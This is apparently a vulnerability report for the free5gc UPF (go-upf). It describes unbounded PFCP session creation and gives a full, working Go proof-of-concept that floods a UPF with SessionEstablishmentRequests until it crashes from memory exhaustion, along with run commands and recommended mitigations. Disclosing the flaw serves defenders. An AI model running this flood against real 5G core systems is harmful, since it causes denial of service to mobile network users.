## Bug Decription
The free5gc UPF (go-upf) allows an unauthenticated/rogue PFCP peer to trigger unbounded session state growth by repeatedly sending PFCP SessionEstablishmentRequest messages with unique SEIDs while never sending the corresponding SessionDeletionRequest.

In LocalNode.NewSess() (node.go:651-672), each new session is appended to n.sess (and associated state is allocated) without enforcing any upper bound or applying admission control. As a result, a remote attacker on the PFCP interface can continuously create new UPF sessions until the UPF process exhausts memory and is killed by the kernel OOM killer, causing a Denial of Service.

## To Reproduce
Steps to reproduce the behavior:
1. Start a new go project inside a new folder: go mod init poc and Create a main.go and paste the code below:
```
// Vuln-PC1-04: UPF Session Pool Exhaustion (Memory Exhaustion DoS)
// Target: free5gc UPF (go-upf)
// Impact: Denial of Service - Out of Memory (OOM) crash
//
// Vulnerability: The UPF's LocalNode.NewSess() at node.go:651-672 has no limit
// on session count. Each SessionEstablishmentRequest creates a new session
// that is appended to n.sess slice. Without corresponding SessionDeletionRequests,
// sessions accumulate indefinitely causing memory exhaustion.
//
// Attack Vector:
// 1. Establish PFCP association with UPF
// 2. Send large number of SessionEstablishmentRequests (each with unique SEID)
// 3. Never send SessionDeletionRequests
// 4. UPF memory grows until OOM crash

package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"sync/atomic"
	"time"

	"github.com/wmnsk/go-pfcp/ie"
	"github.com/wmnsk/go-pfcp/message"
)

var (
	nodeID       string
	sessionCount uint64
	seqNum       uint32
)

func main() {
	// Command line arguments
	targetIP := flag.String("target", "10.100.200.2", "Target UPF IP address")
	targetPort := flag.Int("port", 8805, "Target UPF PFCP port")
	localNodeID := flag.String("nodeid", "", "Local Node ID (IP address)")
	numSessions := flag.Int("count", 50000, "Number of sessions to create")
	rateLimit := flag.Int("rate", 1000, "Sessions per second (0 = unlimited)")
	dryRun := flag.Bool("dry-run", false, "Show what would be done without sending")
	flag.Parse()

	// Get local IP for NodeID
	if *localNodeID != "" {
		nodeID = *localNodeID
	} else {
		localIP := getLocalIP(*targetIP)
		if localIP == "" {
			log.Fatalf("[-] Failed to get local IP address")
		}
		nodeID = localIP
	}

	targetAddr := fmt.Sprintf("%s:%d", *targetIP, *targetPort)

	log.Printf("[*] Vuln-PC1-04: UPF Session Pool Exhaustion")
	log.Printf("[*] Target UPF: %s", targetAddr)
	log.Printf("[*] Local NodeID: %s", nodeID)
	log.Printf("[*] Sessions to create: %d", *numSessions)
	log.Printf("[*] Rate limit: %d sessions/sec", *rateLimit)

	if *dryRun {
		log.Printf("[*] DRY RUN MODE - No packets will be sent")
		log.Printf("[*] Would create %d sessions consuming ~%d MB memory",
			*numSessions, estimateMemory(*numSessions))
		return
	}

	// Resolve target address
	raddr, err := net.ResolveUDPAddr("udp", targetAddr)
	if err != nil {
		log.Fatalf("[-] Failed to resolve target address: %v", err)
	}

	// Create UDP connection
	conn, err := net.DialUDP("udp", nil, raddr)
	if err != nil {
		log.Fatalf("[-] Failed to create UDP connection: %v", err)
	}
	defer conn.Close()

	// Step 1: Establish PFCP association
	if !establishAssociation(conn) {
		log.Printf("[-] Failed to establish association, continuing anyway...")
	}

	// Step 2: Flood with SessionEstablishmentRequests
	log.Printf("[*] Starting session flood attack...")
	startTime := time.Now()

	interval := time.Duration(0)
	if *rateLimit > 0 {
		interval = time.Second / time.Duration(*rateLimit)
	}

	for i := 0; i < *numSessions; i++ {
		seid := uint64(0xA77AC0000000) + uint64(i)
		sendSessionEstablishment(conn, seid)

		if interval > 0 {
			time.Sleep(interval)
		}

		// Progress report every 100 sessions
		if (i+1)%100 == 0 {
			elapsed := time.Since(startTime).Seconds()
			rate := float64(i+1) / elapsed
			log.Printf("[*] Progress: %d/%d sessions (%.1f sessions/sec)",
				i+1, *numSessions, rate)
		}
	}

	elapsed := time.Since(startTime)
	log.Printf("[+] Attack complete!")
	log.Printf("[*] Created %d sessions in %v", *numSessions, elapsed)
	log.Printf("[*] Estimated UPF memory consumption: ~%d MB", estimateMemory(*numSessions))
	log.Printf("[!] Check UPF memory usage and logs for OOM errors")
}

func getLocalIP(targetIP string) string {
	conn, err := net.Dial("udp", targetIP+":8805")
	if err != nil {
		addrs, err := net.InterfaceAddrs()
		if err != nil {
			return ""
		}
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.To4() != nil {
					return ipnet.IP.String()
				}
			}
		}
		return "127.0.0.1"
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String()
}

func establishAssociation(conn *net.UDPConn) bool {
	log.Printf("[*] Step 1: Establishing PFCP association...")

	seq := atomic.AddUint32(&seqNum, 1)
	req := message.NewAssociationSetupRequest(
		seq,
		ie.NewNodeIDHeuristic(nodeID),
		ie.NewRecoveryTimeStamp(time.Now()),
	)

	payload, err := req.Marshal()
	if err != nil {
		log.Printf("[-] Failed to marshal AssociationSetupRequest: %v", err)
		return false
	}

	_, err = conn.Write(payload)
	if err != nil {
		log.Printf("[-] Failed to send AssociationSetupRequest: %v", err)
		return false
	}

	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	buf := make([]byte, 2048)
	n, err := conn.Read(buf)
	if err != nil {
		log.Printf("[-] No response to AssociationSetupRequest: %v", err)
		return false
	}

	msg, err := message.Parse(buf[:n])
	if err != nil {
		log.Printf("[-] Failed to parse response: %v", err)
		return false
	}

	if msg.MessageType() == message.MsgTypeAssociationSetupResponse {
		log.Printf("[+] Association established successfully")
		return true
	}

	log.Printf("[-] Unexpected response type: %d", msg.MessageType())
	return false
}

func sendSessionEstablishment(conn *net.UDPConn, seid uint64) {
	seq := atomic.AddUint32(&seqNum, 1)

	// Create minimal but valid SessionEstablishmentRequest
	// Each session allocates memory in UPF for session state
	req := message.NewSessionEstablishmentRequest(
		0,    // MP
		0,    // FO
		0,    // SEID (0 for new session)
		seq,  // Sequence Number
		0,    // Priority
		ie.NewNodeIDHeuristic(nodeID),
		ie.NewFSEID(seid, net.ParseIP(nodeID), nil),
		ie.NewCreatePDR(
			ie.NewPDRID(1),
			ie.NewPrecedence(100),
			ie.NewPDI(
				ie.NewSourceInterface(ie.SrcInterfaceAccess),
				ie.NewFTEID(0x01, uint32(seid&0xFFFFFFFF), net.ParseIP("10.0.0.1"), nil, 0),
			),
			ie.NewFARID(1),
		),
		ie.NewCreateFAR(
			ie.NewFARID(1),
			ie.NewApplyAction(0x02), // Forward
			ie.NewForwardingParameters(
				ie.NewDestinationInterface(ie.DstInterfaceCore),
			),
		),
	)

	payload, err := req.Marshal()
	if err != nil {
		log.Printf("[-] Failed to marshal session %d: %v", seid, err)
		return
	}

	_, err = conn.Write(payload)
	if err != nil {
		log.Printf("[-] Failed to send session %d: %v", seid, err)
	}

	atomic.AddUint64(&sessionCount, 1)
}

// estimateMemory estimates memory usage per session in MB
// Each session in UPF contains: Sess struct, PDRInfo map, FARIDs map, etc.
// Rough estimate: ~2-5KB per session
func estimateMemory(sessions int) int {
	bytesPerSession := 4096 // 4KB estimate
	totalBytes := sessions * bytesPerSession
	return totalBytes / (1024 * 1024) // Convert to MB
}
```
2. Download required libraries: `go mod tidy`
3. Run the program with the upf pfcp server address:`go run main.go -count 20000 -rate 2000`

## Expected Behavior
UPF should validate and rate-limit PFCP session creation requests (e.g., per peer / per time window).
UPF should enforce a maximum number of concurrent PFCP sessions and reject excess SessionEstablishmentRequest with an appropriate PFCP error/cause.

